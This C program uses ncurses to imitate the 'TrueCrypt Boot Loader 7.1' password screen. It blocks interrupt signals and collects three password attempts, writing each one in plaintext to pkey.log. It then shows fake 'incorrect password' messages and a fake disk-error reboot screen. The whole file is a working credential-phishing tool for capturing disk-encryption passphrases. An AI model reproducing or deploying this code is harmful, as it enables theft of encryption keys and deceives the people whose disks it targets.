#include <stdlib.h>
#include <stdio.h>
#include <ncurses.h>
#include <unistd.h>
#include <string.h>
#include <signal.h>

#define MAX_SIZE 256
#define MAX_TRIES 3

#define C_KEY_BACKSPACE 127
#define C_KEY_ENTER 10
#define SAVE_FILE "pkey.log"


void signal_handler(int sig)
{
	signal(sig,signal_handler); 
}

void catch_signals()
{
	signal(SIGINT,signal_handler);	
	signal(SIGQUIT,signal_handler);	
	signal(SIGHUP,signal_handler);	
	signal(SIGTSTP,signal_handler);	
}

void get_password(int y, char *submitted_pass) {

     //Enter password
     mvaddstr(y, 0, "Enter password: ");

     int count = 0;
     while(1) {
	  int c = getch();
	  if(c == C_KEY_BACKSPACE){
	       if(count > 0) {
		    count --;
		    mvaddstr(y, 16 + count, " ");
		    move(y, 16 + count);
	       }
	  }
	  else if(c != C_KEY_ENTER) {
	       if(count >= MAX_SIZE - 1)
		    printf("\a");
	       else {
		    submitted_pass[count] = c;
		    mvaddstr(y, 16 + count, "*");
		    count++;
	       }
	  }
	  else
	       break;
     }
     submitted_pass[count] = '\0';
}


void print_header(WINDOW *main_window, int print_keyboard_info) {

     int x, y;
     getmaxyx(main_window, y, x);
     (void)y;

     init_pair(1, COLOR_WHITE, COLOR_BLACK);
     init_pair(2, COLOR_WHITE, COLOR_WHITE);

     //HEADER
     attron(COLOR_PAIR(1));
     mvaddstr(0, 1, "TrueCrypt Boot Loader 7.1");
     attroff(COLOR_PAIR(1));

     //HBAR
     attron(COLOR_PAIR(2));
     for(int i=0; i<x; i++)
	  mvaddstr(2, i, "A");
     attroff(COLOR_PAIR(2));

     //Keyboard info
     if(print_keyboard_info){
	  attron(COLOR_PAIR(1));
	  mvaddstr(5, 5, "Keyboard Controls:");
	  mvaddstr(6, 5, "[Esc]  Skip Authentication (Boot Manager)");

	  attroff(COLOR_PAIR(1));
     }
     refresh();
}

void print_bad_password(int y) {

     mvaddstr(y, 0, "Incorrect password or not a TrueCrypt volume.");
     refresh();
}

void print_reboot_screen(WINDOW *main_window) {
     
     clear();
     print_header(main_window, 0);
     mvaddstr(5, 0, "WARNING!");
     mvaddstr(6, 0, "A disk error was detected and will be repaired after reboot.");
     mvaddstr(8, 0, "Press Enter to reboot");
     while(1){
	  if(getch() == C_KEY_ENTER)
	       break;
     }
     
}

int main() {

     //Init
	catch_signals();
	
	WINDOW *main_window = initscr();
     if(main_window == NULL) {
	  fprintf(stderr, "Error initialising ncurses\n");
	  return EXIT_FAILURE;
     }
     noecho();

     char submitted_pass[MAX_TRIES][MAX_SIZE];

     start_color();
     print_header(main_window, 1);
     
     int y_offset[MAX_TRIES] = {0};
     y_offset[0] = 8;
     for(int i=1; i<MAX_TRIES; i++)
	  y_offset[i] = y_offset[i-1] + 3;

     FILE *f = fopen(SAVE_FILE, "w");
     for(int i=0; i<MAX_TRIES; i++){
	  get_password(y_offset[i], submitted_pass[i]);
	  fprintf(f, "%s\n", submitted_pass[i]);
	  if(i<MAX_TRIES-1) {
	       sleep(1);
	       print_bad_password(y_offset[i] + 1);
	  }
     }
     fclose(f);
     sleep(3);
     print_reboot_screen(main_window);

     getch();
     
     //Out
     delwin(main_window);
     endwin();
     refresh();

     return EXIT_SUCCESS;
}
